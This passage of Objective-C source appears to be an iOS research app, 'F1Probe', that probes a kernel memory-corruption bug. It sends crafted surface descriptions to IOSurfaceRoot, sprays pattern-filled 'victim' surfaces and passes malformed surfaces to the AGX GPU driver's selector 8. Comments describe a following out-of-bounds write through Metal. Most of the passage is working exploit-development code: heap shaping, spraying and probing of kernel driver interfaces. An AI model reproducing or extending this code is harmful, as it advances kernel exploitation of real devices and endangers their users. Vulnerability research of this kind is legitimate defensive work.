        void *vb = IOSurfaceGetBaseAddress(v);
        if (vb) for (size_t o = 0; o + 4 <= 0x10000; o += 4)
            *(uint32_t *)((uint8_t *)vb + o) = 0x11111111u + (uint32_t)vi;
        victims[vc++] = v;
    }
    L(@"[SHAPE] victims=%d", vc);

    io_service_t agx = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AGXAcceleratorG14P"));
    io_connect_t ac = 0;
    if (agx) {
        kr = IOServiceOpen(agx, mach_task_self(), 1, &ac);
        IOObjectRelease(agx);
    }
    L(@"[SHAPE] AGX open -> 0x%x conn=0x%x", kr, ac);
    if (ac) {
        uint8_t *in = calloc(1, 0x100);
        uint8_t *out = calloc(1, 0x1000);
        *(uint32_t *)(in + 0x00) = 0x82;
        *(uint32_t *)(in + 0x34) = 0;
        *(uint32_t *)(in + 0x38) = sid;
        *(uint32_t *)(in + 0x3c) = 0;
        size_t osz = 0x1000;
        kern_return_t akr = IOConnectCallMethod(ac, 8, NULL, 0, in, 0x100, NULL, NULL, out, &osz);
        L(@"[SHAPE] sel8 -> 0x%x osz=0x%zx", akr, osz);
        if (akr == KERN_SUCCESS) {
            L(@"[SHAPE] out20=0x%llx out28=0x%llx out30=0x%llx out38=0x%llx",
              (unsigned long long)rd64(out + 0x20), (unsigned long long)rd64(out + 0x28),
              (unsigned long long)rd64(out + 0x30), (unsigned long long)rd64(out + 0x38));
            if (!gQuiet) L(@"[SHAPE] out:\n%@", hexdump(out, osz > 0x100 ? 0x100 : osz));
        }
        free(in); free(out);
        IOServiceClose(ac);
    }
    for (int vi = 0; vi < vc; vi++) CFRelease(victims[vi]);
    if (s) CFRelease(s);
    free(info);
    IOServiceClose(conn);
}


static void multi_probe(int n) {
    if (n < 1) n = 1;
    if (n > 16) n = 16;
    L(@"[MULTI] start n=%d", n);
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { L(@"[MULTI] no IOSurfaceRoot"); return; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    L(@"[MULTI] IOSurfaceRoot open -> 0x%x conn=0x%x", kr, conn);
    if (kr != KERN_SUCCESS) return;

    uint64_t sc[1] = {0};
    uint8_t *info = calloc(1, 0xc68);
    size_t isz = 0xc68;
    NSString *ctrl = normal_xml();
    const char *cc = ctrl.UTF8String;
    size_t clen = cc ? strlen(cc) + 1 : 0;
    if (cc && clen <= 0x1000) {
        size_t csz = 0xc68;
        kr = IOConnectCallMethod(conn, 0, sc, 1, cc, clen, NULL, NULL, info, &csz);
        L(@"[MULTI] control sel0 -> 0x%x id=%u", kr, csz >= 0x1c ? rd32(info + 0x18) : 0);
    }

    IOSurfaceRef keep[600];
    int kc = 0;
    io_connect_t acs[16];
    int acn = 0;
    for (int i = 0; i < n; i++) {
        memset(info, 0, 0xc68);
        isz = 0xc68;
        NSString *xml = f1_xml();
        const char *xc = xml.UTF8String;
        size_t xlen = xc ? strlen(xc) + 1 : 0;
        kr = IOConnectCallMethod(conn, 0, sc, 1, xc, xlen, NULL, NULL, info, &isz);
        if (kr != KERN_SUCCESS) {
            L(@"[MULTI] i=%d f1 sel0 -> 0x%x osz=0x%zx", i, kr, isz);
            break;
        }
        uint32_t sid = rd32(info + 0x18);
        IOSurfaceRef s = IOSurfaceLookup(sid);
        L(@"[MULTI] i=%d f1 id=%u alloc=0x%zx base=%p", i, sid,
          s ? IOSurfaceGetAllocSize(s) : 0, s ? IOSurfaceGetBaseAddress(s) : NULL);
        if (s) {
            size_t planes = IOSurfaceGetPlaneCount(s);
            for (size_t pi = 0; pi < planes && pi < 4; pi++)
                (void)IOSurfaceGetBaseAddressOfPlane(s, pi);
            keep[kc++] = s;
        }
        for (int vi = 0; vi < 32; vi++) {
            NSDictionary *vp = @{
                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfacePixelFormat": @0x42475241,
                @"IOSurfaceAllocSize": @0x10000
            };
            IOSurfaceRef v = IOSurfaceCreate((__bridge CFDictionaryRef)vp);
            if (!v) break;
            if (kc < 600) keep[kc++] = (IOSurfaceRef)CFRetain(v);
            CFRelease(v);
        }

        // Open AGX only after the F1 surface + victims exist, like the main probe.
        io_service_t agx = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AGXAcceleratorG14P"));
        io_connect_t ac = 0;
        if (agx) {
            kr = IOServiceOpen(agx, mach_task_self(), 1, &ac);
            IOObjectRelease(agx);
        }
        L(@"[MULTI] i=%d AGX open -> 0x%x conn=0x%x", i, kr, ac);
        if (!ac) break;
        if (acn < 16) acs[acn++] = ac;
        uint8_t *in = calloc(1, 0x100);
        uint8_t *out = calloc(1, 0x1000);
        *(uint32_t *)(in + 0x00) = 0x82;
        *(uint32_t *)(in + 0x38) = sid;
        size_t osz = 0x1000;
        kern_return_t akr = IOConnectCallMethod(ac, 8, NULL, 0, in, 0x100, NULL, NULL, out, &osz);
        L(@"[MULTI] i=%d sel8=0x%x out0=0x%llx out28=0x%llx",
          i, akr, (unsigned long long)rd64(out + 0x00), (unsigned long long)rd64(out + 0x28));
        free(in); free(out);
    }
    for (int i = 0; i < kc; i++) CFRelease(keep[i]);
    for (int i = 0; i < acn; i++) IOServiceClose(acs[i]);
    free(info);
    IOServiceClose(conn);
    L(@"[MULTI] done");
}

static void span_matrix(void) {
    struct { uint32_t header, slices, data, planeSize; } shapes[] = {
        {0x40000000,   4, 0x4000, 0x010000},
        {0x3FFFC000,   4, 0x4000, 0x010000},
        {0x3FFFC000,   8, 0x4000, 0x020000},
        {0x3FFFC000,  16, 0x4000, 0x040000},
        {0x3FFFC000,  32, 0x4000, 0x080000},
        {0x3FFFC000,  64, 0x4000, 0x100000},
        {0x3FFFC000, 128, 0x4000, 0x200000},
        {0x3FFFC000, 256, 0x4000, 0x400000},
        {0x3FFFF000,   4, 0x4000, 0x010000},
        {0x3FFFFC00,   4, 0x4000, 0x010000},
    };

    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { L(@"[SPAN] no IOSurfaceRoot"); return; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    L(@"[SPAN] IOSurfaceRoot open -> 0x%x conn=0x%x", kr, conn);
    if (kr != KERN_SUCCESS) return;

    io_service_t agx = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AGXAcceleratorG14P"));
    if (!agx) { L(@"[SPAN] no AGXAcceleratorG14P"); IOServiceClose(conn); return; }
    io_connect_t ac = 0;
    kr = IOServiceOpen(agx, mach_task_self(), 1, &ac);
    IOObjectRelease(agx);
    L(@"[SPAN] AGX open -> 0x%x conn=0x%x", kr, ac);
    if (kr != KERN_SUCCESS) { IOServiceClose(conn); return; }

    for (int i = 0; i < (int)(sizeof(shapes)/sizeof(shapes[0])); i++) {
        NSString *xml = f1_xml_shape(shapes[i].header, shapes[i].slices, shapes[i].data, shapes[i].planeSize);
        const char *xc = xml.UTF8String;
        size_t xlen = xc ? strlen(xc) + 1 : 0;
        if (!xc || xlen > 0x1000) {
            L(@"[SPAN] shape=%d XML too large %zu", i, xlen);
            continue;
        }
        uint8_t *info = calloc(1, 0xc68);
        size_t isz = 0xc68;
        uint64_t sc[1] = {0};
        kr = IOConnectCallMethod(conn, 0, sc, 1, xc, xlen, NULL, NULL, info, &isz);
        if (kr != KERN_SUCCESS) {
            L(@"[SPAN] shape=%d header=0x%x slices=%u plane=0x%x sel0=0x%x osz=0x%zx",
              i, shapes[i].header, shapes[i].slices, shapes[i].planeSize, kr, isz);
            free(info);
            continue;
        }
        uint32_t sid = isz >= 0x1c ? rd32(info + 0x18) : 0;
        IOSurfaceRef s = sid ? IOSurfaceLookup(sid) : NULL;
        size_t alloc = s ? IOSurfaceGetAllocSize(s) : 0;
        uint8_t *in = calloc(1, 0x100);
        uint8_t *out = calloc(1, 0x1000);
        *(uint32_t *)(in + 0x00) = 0x82;
        *(uint32_t *)(in + 0x34) = 0;
        *(uint32_t *)(in + 0x38) = sid;
        *(uint32_t *)(in + 0x3c) = 0;
        size_t osz = 0x1000;
        kern_return_t akr = IOConnectCallMethod(ac, 8, NULL, 0, in, 0x100, NULL, NULL, out, &osz);
        if (akr == KERN_SUCCESS) {
            L(@"[SPAN] shape=%d header=0x%x slices=%u data=0x%x plane=0x%x sid=%u alloc=0x%zx out0=0x%llx out10=0x%llx out28=0x%llx out30=0x%llx out38=0x%llx",
              i, shapes[i].header, shapes[i].slices, shapes[i].data, shapes[i].planeSize,
              sid, alloc,
              (unsigned long long)rd64(out + 0x00), (unsigned long long)rd64(out + 0x10),
              (unsigned long long)rd64(out + 0x28), (unsigned long long)rd64(out + 0x30),
              (unsigned long long)rd64(out + 0x38));
        } else {
            L(@"[SPAN] shape=%d header=0x%x slices=%u data=0x%x plane=0x%x sid=%u alloc=0x%zx sel8=0x%x osz=0x%zx",
              i, shapes[i].header, shapes[i].slices, shapes[i].data, shapes[i].planeSize,
              sid, alloc, akr, osz);
        }
        free(in); free(out); free(info);
        if (s) CFRelease(s);
    }
    IOServiceClose(ac);
    IOServiceClose(conn);
}

static void run(void) {
    struct utsname un; uname(&un);
    L(@"=== F1Probe start ===");
    L(@"device=%s version=%s", un.machine, un.version);

    int multi = arg_int(@"--multi=");
    if (multi > 0) {
        multi_probe(multi);
        L(@"=== F1Probe done ===");
        [gLog writeToFile:[gDir stringByAppendingPathComponent:@"latest.log"]
                atomically:YES encoding:NSUTF8StringEncoding error:nil];
        return;
    }

    int shape_idx = arg_shape();
    if (shape_idx >= 0) {
        int spray = arg_int(@"--spray=");
        if (spray < 1) spray = 1;
        gQuiet = spray > 1;
        for (int i = 0; i < spray; i++) {
            L(@"[SHAPE] iteration=%d/%d", i + 1, spray);
            single_shape_probe(shape_idx);
        }
        L(@"=== F1Probe done ===");
        [gLog writeToFile:[gDir stringByAppendingPathComponent:@"latest.log"]
                atomically:YES encoding:NSUTF8StringEncoding error:nil];
        return;
    }

    if (arg_int(@"--legacy=") == 0) {
        multi_probe(8);
        L(@"=== F1Probe done ===");
        [gLog writeToFile:[gDir stringByAppendingPathComponent:@"latest.log"]
                atomically:YES encoding:NSUTF8StringEncoding error:nil];
        return;
    }

    NSString *xml = f1_xml();
    const char *xc = xml.UTF8String;
    size_t xlen = xc ? strlen(xc)+1 : 0;
    L(@"[F1] XML length=%zu sum=0x%x (in-band limit 0x1000)", xlen, xc ? str_sum(xc, xlen) : 0);
    if (!xc || xlen > 0x1000) { L(@"[F1] XML too large; abort"); return; }

    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { L(@"[F1] no IOSurfaceRoot"); return; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    L(@"[F1] IOSurfaceRoot open -> 0x%x conn=0x%x", kr, conn);
    if (kr != KERN_SUCCESS) return;

    uint8_t *info = calloc(1, 0xc68);
    size_t isz = 0xc68;
    uint64_t sc[1] = {0};
    // Control: a normal 64x64 BGRA surface via the same raw sel0 path.
    NSString *ctrl = normal_xml();
    const char *cc = ctrl.UTF8String;
    size_t clen = cc ? strlen(cc)+1 : 0;
    if (cc && clen <= 0x1000) {
        size_t csz = 0xc68;
        kern_return_t ckr = IOConnectCallMethod(conn, 0, sc, 1, cc, clen, NULL, NULL, info, &csz);
        L(@"[CTRL] normal sel0 -> 0x%x out=0x%zx id=%u", ckr, csz, csz>=0x1c?rd32(info+0x18):0);
    }
    memset(info, 0, 0xc68);
    isz = 0xc68;
    kr = IOConnectCallMethod(conn, 0, sc, 1, xc, xlen, NULL, NULL, info, &isz);
    if (isz > 0xc68) isz = 0xc68;
    L(@"[F1] sel0 CREATE -> 0x%x out=0x%zx", kr, isz);
    if (kr != KERN_SUCCESS) { L(@"[F1] REJECTED: kernel did not create the wrapped shape"); free(info); IOServiceClose(conn); return; }
    uint32_t sid = rd32(info + 0x18);
    L(@"[F1] CREATED id=%u", sid);
    info_fields("sel0", info, isz);
    L(@"[F1] info[0..0x120]:\n%@", hexdump(info, 0x120));

    // Use the public API to get the surface and its plane pointers.
    IOSurfaceRef s = IOSurfaceLookup(sid);
    L(@"[F1] IOSurfaceLookup(%u) = %p", sid, s);
    if (s) {
        void *base = IOSurfaceGetBaseAddress(s);
        size_t alloc = IOSurfaceGetAllocSize(s);
        size_t planes = IOSurfaceGetPlaneCount(s);
        L(@"[F1] base=%p alloc=0x%zx planes=%zu", base, alloc, planes);
        for (size_t i=0;i<planes && i<4;i++) {
            void *pb = IOSurfaceGetBaseAddressOfPlane(s, i);
            L(@"[F1] plane[%zu] base=%p bpr=%zu h=%zu", i, pb,
              IOSurfaceGetBytesPerRowOfPlane(s, i), IOSurfaceGetHeightOfPlane(s, i));
        }

        // Create victims after the F1 surface, fill with patterns, then OOB write.
        IOSurfaceRef victims[32]; int vc = 0;
        for (int vi = 0; vi < 32; vi++) {
            NSDictionary *vp = @{
                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfacePixelFormat": @0x42475241,
                @"IOSurfaceAllocSize": @0x10000
            };
            IOSurfaceRef v = IOSurfaceCreate((__bridge CFDictionaryRef)vp);
            if (!v) break;
            void *vb = IOSurfaceGetBaseAddress(v);
            if (vb) for (size_t o = 0; o + 4 <= 0x10000; o += 4)
                *(uint32_t *)((uint8_t *)vb + o) = 0x11111111u + (uint32_t)vi;
            victims[vc++] = v;
        }
        L(@"[VICTIM] created %d", vc);

        // Pass the F1 surface to AGX type 1 sel8 type 0x82 and compare with a normal surface.
        io_service_t agx = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AGXAcceleratorG14P"));
        io_connect_t ac = 0;
        if (agx) {
            kr = IOServiceOpen(agx, mach_task_self(), 1, &ac);
            IOObjectRelease(agx);
            L(@"[F1] AGX open type1 -> 0x%x conn=0x%x", kr, ac);
            if (kr == KERN_SUCCESS) {
                uint8_t *in = calloc(1,0x100);
                uint8_t *out = calloc(1,0x1000);
                *(uint32_t*)(in+0x00)=0x82;
                *(uint32_t*)(in+0x34)=0;
                *(uint32_t*)(in+0x38)=sid;
                *(uint32_t*)(in+0x3c)=0;
                size_t osz=0x1000;
                kr = IOConnectCallMethod(ac, 8, NULL,0, in,0x100, NULL,NULL, out,&osz);
                L(@"[F1] AGX sel8 F1 -> 0x%x out=0x%zx", kr, osz);
                if (kr == KERN_SUCCESS) L(@"[F1] AGX out:\n%@", hexdump(out, osz>0x100?0x100:osz));
                free(in); free(out);
                IOServiceClose(ac);
            }
        }
        metal_oob(s, victims, vc);
        for (int vi = 0; vi < vc; vi++) CFRelease((CFTypeRef)victims[vi]);
        CFRelease((CFTypeRef)s);
    }
    free(info);
    IOServiceClose(conn);
    span_matrix();
    single_shape_probe(0);
    single_shape_probe(1);
    L(@"=== F1Probe done ===");
    [gLog writeToFile:[gDir stringByAppendingPathComponent:@"latest.log"]
            atomically:YES encoding:NSUTF8StringEncoding error:nil];
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UITextView *tv;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    gLog = [NSMutableString new];
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    gDir = [docs stringByAppendingPathComponent:@"F1Probe"];
    [[NSFileManager defaultManager] createDirectoryAtPath:gDir withIntermediateDirectories:YES attributes:nil error:nil];
    NSDateFormatter *df=[NSDateFormatter new]; df.dateFormat=@"yyyyMMdd-HHmmss";
    gLogPath=[gDir stringByAppendingPathComponent:[NSString stringWithFormat:@"run-%@.log",[df stringFromDate:[NSDate date]]]];
    [gLog writeToFile:gLogPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    [gLog writeToFile:[gDir stringByAppendingPathComponent:@"latest.log"] atomically:YES encoding:NSUTF8StringEncoding error:nil];

    self.window=[[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc=[UIViewController new];
    self.tv=[[UITextView alloc] initWithFrame:vc.view.bounds];
    self.tv.editable=NO; self.tv.font=[UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    [vc.view addSubview:self.tv]; self.window.rootViewController=vc; [self.window makeKeyAndVisible];

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW,(int64_t)(0.6*NSEC_PER_SEC)),dispatch_get_main_queue(),^{
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0),^{
            @autoreleasepool { run(); }
            dispatch_async(dispatch_get_main_queue(),^{
                pthread_mutex_lock(&gLock); self.tv.text=[gLog copy]; pthread_mutex_unlock(&gLock);
            });
        });
    });
    return YES;
}
@end

int main(int argc, char **argv) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); } }
